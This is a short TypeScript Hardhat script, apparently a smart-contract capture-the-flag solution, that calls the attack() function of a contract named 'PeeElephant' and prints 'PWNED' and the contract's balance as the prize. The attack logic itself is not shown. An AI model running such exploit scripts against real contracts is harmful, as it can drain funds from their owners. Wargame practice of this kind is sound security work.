import { ethers } from "hardhat"
import { ADDRESSES, PLAYER } from "../consts"
import { getSigner } from "../utils"

async function pwn() {
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "PeeElephant",
        ADDRESSES.peeElephant,
        signer
    )
    // const send = await signer?.sendTransaction({
    //     to: contract.address,
    //     from: PLAYER,
    //     value: ethers.utils.parseUnits("0.00069")
    // })
    const donate = await contract.attack()
    console.log("PWNING")
    const receipt = await donate?.wait()
    console.log(receipt)
    console.log("PWNED")
    console.log("CLAIMING PRIZE< GO TO TRUFFLE DASHBOARD")
    const prize = await signer?.provider?.getBalance(contract.address)
    console.log(prize)
    console.log("PRIZE CLAIMED")
}

pwn()